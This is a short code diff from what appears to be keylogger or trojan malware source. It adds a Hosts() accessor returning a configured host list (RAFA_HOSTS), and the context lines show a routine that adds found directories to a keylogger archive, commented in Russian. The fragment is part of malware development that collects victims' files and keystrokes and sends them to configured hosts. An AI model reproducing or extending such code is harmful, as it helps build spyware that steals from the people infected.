@@ -11,6 +11,12 @@ static char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;
 
 namespace Rafa {
 
+	PCHAR Hosts()
+	{
+		return RAFA_HOSTS;
+    }
+
+
 	void AddFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel) {
 		// Добавляем директорию в архив кейлогера
 		KeyLogger::AddDirectory(FileName, Search->cFileName);
